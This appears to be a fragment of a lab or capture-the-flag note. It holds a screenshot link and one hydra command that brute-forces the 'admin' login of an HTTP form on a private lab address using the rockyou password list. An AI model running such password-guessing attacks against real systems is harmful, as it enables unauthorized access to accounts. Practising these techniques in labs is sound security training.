![image](https://user-images.githubusercontent.com/74050386/198943048-488321cd-65d7-4c80-bbb9-e70f44d2f64f.png)


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.100.200 -s 47002 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
